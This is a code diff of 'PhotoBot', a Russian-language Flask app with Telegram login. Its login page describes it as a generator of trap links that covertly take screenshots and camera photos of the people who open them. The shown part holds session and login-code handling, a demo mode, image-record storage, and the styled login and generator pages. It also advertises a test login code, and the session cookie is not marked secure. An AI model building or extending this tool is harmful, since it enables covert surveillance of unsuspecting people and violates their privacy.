+        cursor.execute('''
+            INSERT INTO login_codes (code, user_id, telegram_data, expires_at)
+            VALUES (?, ?, ?, datetime(CURRENT_TIMESTAMP, ?))
+        ''', (code, user_id, json.dumps(telegram_data), f'+{LOGIN_CODE_EXPIRE_MINUTES} minutes'))
+        conn.commit()
+        conn.close()
+    return code
+
+def get_login_code(code):
+    """Получить код входа."""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT * FROM login_codes
+            WHERE code = ? AND used = 0 AND expires_at > CURRENT_TIMESTAMP
+        ''', (code.upper(),))
+        result = cursor.fetchone()
+        conn.close()
+        return dict(result) if result else None
+
+def mark_login_code_used(code):
+    """Пометить код входа использованным."""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('UPDATE login_codes SET used = 1 WHERE code = ?', (code.upper(),))
+        conn.commit()
+        conn.close()
+
+def create_demo_user():
+    """Создает временного демо-пользователя."""
+    demo_name = f"demo_{secrets.token_hex(4)}"
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO users (chat_id, username, first_name, last_name, last_login)
+            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
+        ''', (None, demo_name, 'Demo', 'Mode'))
+        user_id = cursor.lastrowid
+        conn.commit()
+        conn.close()
+    return user_id
+
+def delete_user_links(user_id):
+    """Удаляет все ссылки пользователя и связанные файлы."""
+    files_to_remove = []
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        conn.row_factory = sqlite3.Row
+        cursor = conn.cursor()
+        cursor.execute('SELECT link_id FROM links WHERE user_id = ?', (user_id,))
+        for row in cursor.fetchall():
+            files_to_remove.extend(delete_link_records(cursor, row['link_id']))
+        conn.commit()
+        conn.close()
+    if files_to_remove:
+        remove_uploaded_files(files_to_remove)
+
+def clear_demo_session():
+    """Очищает демо-пользователя и его ссылки."""
+    demo_user_id = session.get('user_id')
+    if demo_user_id:
+        delete_user_links(demo_user_id)
+        with db_lock:
+            conn = sqlite3.connect(DB_FILE)
+            cursor = conn.cursor()
+            cursor.execute('DELETE FROM users WHERE user_id = ? AND username LIKE "demo_%"', (demo_user_id,))
+            conn.commit()
+            conn.close()
+    session.clear()
+
+def is_demo_session_expired():
+    """Проверяет срок жизни ознакомительного режима."""
+    if not session.get('demo_mode'):
+        return False
+    expires_at = parse_db_timestamp(session.get('demo_expires_at'))
+    return bool(expires_at and expires_at <= datetime.datetime.now())
+
+def activate_demo_session():
+    """Запускает ознакомительный режим на 10 минут."""
+    user_id = create_demo_user()
+    expires_at = datetime.datetime.now() + datetime.timedelta(minutes=DEMO_SESSION_MINUTES)
+    session.clear()
+    session['user_id'] = user_id
+    session['chat_id'] = None
+    session['username'] = f"demo_{user_id}"
+    session['first_name'] = 'Demo'
+    session['last_name'] = 'Mode'
+    session['demo_mode'] = True
+    session['demo_expires_at'] = expires_at.isoformat()
+    session.permanent = False
+    return expires_at
+
+def save_image_info(link_id, image_type, session_id, filename):
+    """Сохранить информацию об изображении"""
+    with db_lock:
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        
+        cursor.execute('''
+            INSERT INTO images (link_id, image_type, session_id, filename)
+            VALUES (?, ?, ?, ?)
+        ''', (link_id, image_type, session_id, filename))
+        
+        conn.commit()
+        conn.close()
+
+# ========== ДЕКОРАТОР АВТОРИЗАЦИИ ==========
+
+def login_required(f):
+    """Декоратор для проверки авторизации"""
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        # Проверяем Flask сессию
+        if is_demo_session_expired():
+            clear_demo_session()
+            if request.path.startswith('/api/'):
+                return jsonify({'success': False, 'error': 'Demo session expired', 'demo_expired': True}), 401
+            return redirect(url_for('login_page'))
+        if 'user_id' in session:
+            return f(*args, **kwargs)
+        
+        # Проверяем постоянную сессию из куки
+        persistent_session_id = request.cookies.get('persistent_session')
+        if persistent_session_id:
+            persistent_session = get_persistent_session(persistent_session_id)
+            if persistent_session:
+                # Восстанавливаем сессию
+                session['user_id'] = persistent_session['user_id']
+                session['chat_id'] = persistent_session['chat_id']
+                session['username'] = persistent_session['username']
+                session['first_name'] = persistent_session['first_name']
+                session['last_name'] = persistent_session['last_name']
+                session.permanent = True
+                return f(*args, **kwargs)
+        
+        # Проверяем токен авторизации
+        auth_token = request.cookies.get('auth_token')
+        if auth_token:
+            user = get_user_by_token(auth_token)
+            if user:
+                # Создаем сессию
+                session['user_id'] = user['user_id']
+                session['chat_id'] = user['chat_id']
+                session['username'] = user['username']
+                session['first_name'] = user['first_name']
+                session['last_name'] = user['last_name']
+                session.permanent = True
+                
+                # Создаем постоянную сессию
+                user_agent = request.headers.get('User-Agent', '')
+                ip_address = request.remote_addr
+                persistent_session_id = create_persistent_session(
+                    user['user_id'], user_agent, ip_address
+                )
+                
+                response = make_response(redirect(url_for('index')))
+                response.set_cookie(
+                    'persistent_session',
+                    persistent_session_id,
+                    max_age=60*60*24*90,  # 90 дней
+                    httponly=True,
+                    secure=False,
+                    samesite='Lax'
+                )
+                return response
+        
+        # Не авторизован
+        if request.path.startswith('/api/'):
+            return jsonify({'success': False, 'error': 'Authentication required'}), 401
+        return redirect(url_for('login_page'))
+    
+    return decorated_function
+
+# ========== ФУНКЦИИ ДЛЯ QR-КОДОВ ==========
+
+def generate_qr_code_base64(data):
+    """Генерация QR-кода и возврат в base64"""
+    try:
+        qr = qrcode.QRCode(
+            version=1,
+            error_correction=qrcode.constants.ERROR_CORRECT_L,
+            box_size=10,
+            border=4,
+        )
+        qr.add_data(data)
+        qr.make(fit=True)
+        
+        img = qr.make_image(fill_color="black", back_color="white")
+        
+        # Конвертируем в base64
+        buffered = BytesIO()
+        img.save(buffered, format="PNG")
+        img_str = base64.b64encode(buffered.getvalue()).decode()
+        
+        return f"data:image/png;base64,{img_str}"
+    except Exception as e:
+        print(f"Ошибка генерации QR-кода: {e}")
+        return None
+
+# ========== HTML ШАБЛОНЫ ==========
+
+LOGIN_HTML = """<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Screenshot Tracker</title>
+    <title>🕵️‍♂️ PhotoBot - Вход через Telegram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        
+
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #ec4899;
+            --accent: #06b6d4;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --error: #ef4444;
+            --bg-primary: #0f0f23;
+            --bg-secondary: #1a1a2e;
+            --bg-card: rgba(255, 255, 255, 0.05);
+            --bg-glass: rgba(255, 255, 255, 0.08);
+            --text-primary: #ffffff;
+            --text-secondary: #cbd5e1;
+            --text-muted: #94a3b8;
+            --border: rgba(255, 255, 255, 0.1);
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            --shadow-hover: 0 12px 48px rgba(0, 0, 0, 0.4);
+        }
+
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
+            color: var(--text-primary);
             min-height: 100vh;
-            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 2rem;
+            line-height: 1.6;
+            overflow-x: hidden;
         }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 800px;
+
+        /* Анимированный фон */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
+            height: 100%;
+            background:
+                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(120, 219, 226, 0.3) 0%, transparent 50%);
+            animation: backgroundShift 20s ease-in-out infinite alternate;
+            z-index: -1;
         }
-        
+
+        @keyframes backgroundShift {
+            0% { transform: scale(1) rotate(0deg); }
+            100% { transform: scale(1.1) rotate(1deg); }
+        }
+
+        .container {
+            background: var(--bg-glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 3rem;
+            box-shadow: var(--shadow);
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            animation: fadeInUp 0.8s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
+        }
+
+        @keyframes fadeInUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
         h1 {
-            color: #333;
-            margin-bottom: 30px;
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            margin-bottom: 2.5rem;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .telegram-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #0088cc, #229ed9);
+            color: white;
+            text-decoration: none;
+            padding: 1.25rem 2rem;
+            border-radius: 16px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin: 1.5rem 0;
+            box-shadow: 0 8px 24px rgba(0, 136, 204, 0.3);
+            border: none;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            min-width: 250px;
+        }
+
+        .telegram-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.6s;
+        }
+
+        .telegram-btn:hover::before {
+            left: 100%;
+        }
+
+        .telegram-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(0, 136, 204, 0.4);
+        }
+
+        .telegram-btn img {
+            width: 24px;
+            height: 24px;
+            margin-right: 0.75rem;
+        }
+
+        .telegram-btn.loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .telegram-btn.loading::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            margin: auto;
+            border: 2px solid transparent;
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .remember-me {
+            margin: 1.5rem 0;
+            padding: 1rem;
+            background: var(--bg-card);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+        }
+
+        .remember-me input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--primary);
+        }
+
+        .remember-me label {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            cursor: pointer;
+        }
+
+        .login-methods {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+
+        .method-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 1.5rem;
+            text-align: left;
+            transition: all 0.3s ease;
+        }
+
+        .method-card:hover {
+            transform: translateY(-2px);
+            border-color: var(--primary);
+            box-shadow: var(--shadow-hover);
+        }
+
+        .method-card h3 {
+            color: var(--text-primary);
+            margin-bottom: 0.75rem;
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .method-card p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            line-height: 1.5;
+            margin-bottom: 1rem;
+        }
+
+        .code-input-group {
+            display: flex;
+            gap: 0.75rem;
+            margin-top: 1rem;
+        }
+
+        .code-input-group input {
+            flex: 1;
+            padding: 0.875rem 1rem;
+            background: var(--bg-glass);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+
+        .code-input-group input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
+        }
+
+        .code-input-group input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .btn-secondary {
+            background: var(--bg-glass);
+            color: var(--text-primary);
+            border: 1px solid var(--border);
+            padding: 0.875rem 1.5rem;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            white-space: nowrap;
+        }
+
+        .btn-secondary:hover {
+            background: var(--bg-card);
+            border-color: var(--primary);
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary.loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .btn-secondary.loading::after {
+            content: '';
+            width: 16px;
+            height: 16px;
+            margin-left: 0.5rem;
+            border: 2px solid var(--text-primary);
+            border-top-color: transparent;
+            border-radius: 50%;
+            display: inline-block;
+            animation: spin 1s linear infinite;
+        }
+
+        .demo-section {
+            margin: 2rem 0;
+            padding: 1.5rem;
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.1), rgba(245, 158, 11, 0.05));
+            border: 1px solid rgba(245, 158, 11, 0.3);
+            border-radius: 16px;
+        }
+
+        .btn-demo {
+            width: 100%;
+            background: linear-gradient(135deg, var(--warning), #d97706);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 16px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 24px rgba(245, 158, 11, 0.3);
+            margin-bottom: 1rem;
+        }
+
+        .btn-demo:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(245, 158, 11, 0.4);
+        }
+
+        .btn-demo.loading {
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .btn-demo.loading::after {
+            content: '';
+            width: 16px;
+            height: 16px;
+            margin-left: 0.5rem;
+            border: 2px solid transparent;
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            display: inline-block;
+            animation: spin 1s linear infinite;
+        }
+
+        .btn-test {
+            width: 100%;
+            background: var(--bg-glass);
+            color: var(--text-primary);
+            border: 1px solid var(--border);
+            padding: 1rem 2rem;
+            border-radius: 16px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .btn-test:hover {
+            background: var(--bg-card);
+            border-color: var(--primary);
+        }
+
+        .qr-section {
+            margin: 2rem 0;
+            padding: 1.5rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            text-align: center;
+        }
+
+        .qr-section h3 {
+            color: var(--text-primary);
+            margin-bottom: 1rem;
+        }
+
+        .qr-code img {
+            max-width: 200px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+        }
+
+        .instructions {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            text-align: left;
+        }
+
+        .instructions h3 {
+            color: var(--text-primary);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .instructions ol {
+            padding-left: 1.5rem;
+            color: var(--text-muted);
+        }
+
+        .instructions li {
+            margin-bottom: 0.75rem;
+            line-height: 1.5;
+        }
+
+        .instructions .important {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 8px;
+            padding: 0.75rem;
+            margin-top: 1rem;
+            color: #fca5a5;
+            font-size: 0.9rem;
+        }
+
+        .status {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 12px;
+            display: none;
+            animation: slideIn 0.4s ease-out;
+        }
+
+        .status.success {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(16, 185, 129, 0.05));
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            color: var(--success);
+        }
+
+        .status.error {
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(239, 68, 68, 0.05));
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: var(--error);
+        }
+
+        .status.info {
+            background: linear-gradient(135deg, rgba(6, 182, 212, 0.1), rgba(6, 182, 212, 0.05));
+            border: 1px solid rgba(6, 182, 212, 0.3);
+            color: var(--accent);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(10px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .footer {
+            margin-top: 2rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            text-align: center;
+        }
+
+        .footer strong {
+            color: var(--primary);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .container {
+                padding: 2rem;
+                margin: 1rem;
+            }
+
+            h1 {
+                font-size: 2rem;
+            }
+
+            .telegram-btn {
+                min-width: auto;
+                padding: 1rem 1.5rem;
+            }
+
+            .code-input-group {
+                flex-direction: column;
+            }
+
+            .code-input-group input {
+                margin-bottom: 0.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🕵️‍♂️</div>
+        <h1>PhotoBot</h1>
+
+        <p class="subtitle">
+            Генератор ссылок-ловушек с авторизацией через Telegram.
+            Создавайте ссылки, которые незаметно делают скриншот и фото с камеры.
+        </p>
+
+        <div class="remember-me">
+            <input type="checkbox" id="rememberMe" checked>
+            <label for="rememberMe">Запомнить меня на этом устройстве</label>
+        </div>
+
+        <a href="https://t.me/{{ bot_username }}?start=start" class="telegram-btn" target="_blank">
+            <img src="https://telegram.org/img/t_logo.svg" alt="Telegram">
+            Начать чат с ботом
+        </a>
+
+        <div class="login-methods">
+            <div class="method-card">
+                <h3>🔑 Вход по коду</h3>
+                <p>1. Начните чат с ботом (кнопка выше)<br>
+                   2. В боте нажмите «🔐 Войти на сайт»<br>
+                   3. Выберите «🔑 По коду»<br>
+                   4. Введите полученный код ниже</p>
+                <div class="code-input-group">
+                    <input type="text" id="loginCode" maxlength="6" placeholder="Введите код или TEST01">
+                    <button type="button" class="btn-secondary" onclick="loginWithCode()">Войти</button>
+                </div>
+                <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.5rem;">
+                    💡 Код действует {{ login_code_minutes }} минут. Для тестирования: <strong>TEST01</strong>
+                </p>
+            </div>
+        </div>
+
+        <div class="demo-section">
+            <button type="button" class="btn-demo" onclick="startDemoMode()">🚀 Ознакомительный режим ({{ demo_minutes }} мин)</button>
+            <button type="button" class="btn-test" onclick="testBot()">🔧 Протестировать бота</button>
+        </div>
+
+        <div class="qr-section">
+            <h3>📱 Или отсканируйте QR-код</h3>
+            <div class="qr-code">
+                <img src="{{ qr_code_url }}" alt="QR Code для входа">
+            </div>
+        </div>
+
+        <div class="instructions">
+            <h3>📋 Как войти:</h3>
+            <ol>
+                <li>Нажмите кнопку "Начать чат с ботом" или отсканируйте QR-код</li>
+                <li>В Telegram боте нажмите "🔐 Войти на сайт"</li>
+                <li>Выберите способ входа: "🔑 По коду" или "🔗 По ссылке"</li>
+                <li>Следуйте инструкциям бота</li>
+                <li>Вернитесь на эту страницу - вход произойдет автоматически</li>
+            </ol>
+            <div class="important">
+                <strong>Важно:</strong> Сначала начните чат с ботом, иначе он не сможет отправить вам код или ссылку для входа!
+            </div>
+        </div>
+
+        <div class="status" id="status"></div>
+
+        <div class="footer">
+            Бот: <strong>@{{ bot_username }}</strong><br>
+            После входа вы сможете создавать ссылки-ловушки и получать уведомления
+        </div>
+    </div>
+
+    <script>
+        function showStatus(message, type = 'info') {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = message;
+            statusEl.className = 'status ' + type;
+            statusEl.style.display = 'block';
+            setTimeout(() => {
+                statusEl.style.display = 'none';
+            }, 5000);
+        }
+
+        // Проверка авторизации каждые 3 секунды
+        function checkAuth() {
+            fetch('/api/check-auth')
+                .then(response => {
+                    if (!response.ok) throw new Error('Network error');
+                    return response.json();
+                })
+                .then(data => {
+                    const statusEl = document.getElementById('status');
+                    if (data.demo_expired) {
+                        showStatus('Ознакомительный режим завершен. Войдите снова.', 'error');
+                        return;
+                    }
+                    if (data.authenticated) {
+                        statusEl.textContent = data.demo_mode ? '✅ Демо-режим активирован!' : '✅ Авторизация успешна!';
+                        statusEl.className = 'status success';
+                        statusEl.style.display = 'block';
+
+                        // Сохраняем настройку "запомнить меня"
+                        const rememberMe = document.getElementById('rememberMe').checked;
+                        localStorage.setItem('remember_me', rememberMe ? 'true' : 'false');
+
+                        setTimeout(() => {
+                            window.location.href = '/';
+                        }, 1500);
+                    } else if (data.waiting) {
+                        statusEl.textContent = '⏳ Ожидание авторизации в боте...';
+                        statusEl.className = 'status info';
+                        statusEl.style.display = 'block';
+                    } else {
+                        statusEl.style.display = 'none';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    const statusEl = document.getElementById('status');
+                    statusEl.textContent = '⚠️ Ошибка соединения. Проверьте интернет.';
+                    statusEl.className = 'status error';
+                    statusEl.style.display = 'block';
+                });
+        }
+
+        // Восстанавливаем настройку "запомнить меня"
+        function restoreRememberMe() {
+            const rememberMe = localStorage.getItem('remember_me');
+            if (rememberMe !== null) {
+                document.getElementById('rememberMe').checked = rememberMe === 'true';
+            }
+        }
+
+        async function loginWithCode() {
+            const code = document.getElementById('loginCode').value.trim().toUpperCase();
+            if (!code) {
+                showStatus('Введите код из Telegram-бота.', 'error');
+                return;
+            }
+
+            const button = document.querySelector('.btn-secondary');
+            button.classList.add('loading');
+            button.textContent = 'Вход...';
+
+            try {
+                const response = await fetch('/api/login-with-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code })
+                });
+                const data = await response.json();
+                if (!response.ok || !data.success) throw new Error(data.error || 'login');
+                showStatus('Код подтвержден. Перенаправляем...', 'success');
+                setTimeout(() => window.location.href = data.redirect_url || '/', 1000);
+            } catch (error) {
+                showStatus(error.message || 'Не удалось выполнить вход по коду.', 'error');
+            } finally {
+                button.classList.remove('loading');
+                button.textContent = 'Войти';
+            }
+        }
+
+        async function startDemoMode() {
+            const button = document.querySelector('.btn-demo');
+            button.classList.add('loading');
+            button.textContent = 'Запуск...';
+
+            try {
+                const response = await fetch('/api/start-demo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                const data = await response.json();
+                if (!response.ok || !data.success) throw new Error(data.error || 'demo');
+                showStatus('Ознакомительный режим активирован!', 'success');
+                setTimeout(() => window.location.href = data.redirect_url || '/', 1000);
+            } catch (error) {
+                showStatus(error.message || 'Не удалось запустить ознакомительный режим.', 'error');
+            } finally {
+                button.classList.remove('loading');
+                button.textContent = '🚀 Ознакомительный режим ({{ demo_minutes }} мин)';
+            }
+        }
+
+        async function testBot() {
+            const button = document.querySelector('.btn-test');
+            button.textContent = 'Тестирование...';
+
+            try {
+                const response = await fetch('/api/test-bot', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                const data = await response.json();
+                if (!response.ok || !data.success) throw new Error(data.error || 'test');
+                showStatus('🤖 Тестовый запрос к боту выполнен!', 'success');
+            } catch (error) {
+                showStatus('❌ Ошибка тестирования бота: ' + (error.message || 'Неизвестная ошибка'), 'error');
+            } finally {
+                button.textContent = '🔧 Протестировать бота';
+            }
+        }
+
+        // Запускаем проверку при загрузке и каждые 3 секунды
+        document.addEventListener('DOMContentLoaded', () => {
+            restoreRememberMe();
+            checkAuth();
+            setInterval(checkAuth, 3000);
+        });
+    </script>
+</body>
+</html>"""
+GENERATOR_HTML = """<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Генератор ссылок-ловушек</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #6366f1;
+            --secondary: #ec4899;
+            --accent: #06b6d4;
+            --bg-primary: #0f0f23;
+            --bg-secondary: #1a1a2e;
+            --bg-tertiary: #16213e;
+            --text-primary: #e0e0e0;
+            --text-secondary: #a0a0a0;
+            --border-color: rgba(255, 255, 255, 0.1);
+            --success: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 50%, var(--bg-tertiary) 100%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 20% 50%, rgba(99, 102, 241, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 80%, rgba(236, 72, 153, 0.1) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .header {
+            background: rgba(26, 26, 46, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .user-section {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 18px;
+            box-shadow: 0 8px 16px rgba(99, 102, 241, 0.3);
+        }
+
+        .user-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .user-name {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .user-stats {
+            font-size: 12px;
+            color: var(--text-secondary);
+            display: flex;
+            gap: 12px;
+            margin-top: 4px;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 12px;
+        }
+
+        .btn-header {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-header:hover {
+            background: rgba(255, 255, 255, 0.15);
+            border-color: var(--primary);
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+
+        .page-title {
+            text-align: center;
+            margin-bottom: 40px;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        .page-title h1 {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .page-subtitle {
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: 1fr 350px;
+            gap: 24px;
+            margin-bottom: 40px;
+        }
+
+        .main-card {
+            background: rgba(26, 26, 46, 0.6);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 32px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-label i {
+            color: var(--primary);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s ease;
+        }
+
+        .form-input::placeholder {
+            color: var(--text-secondary);
+        }
+
+        .form-input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: white;
+            border: none;
+            padding: 12px 24px;
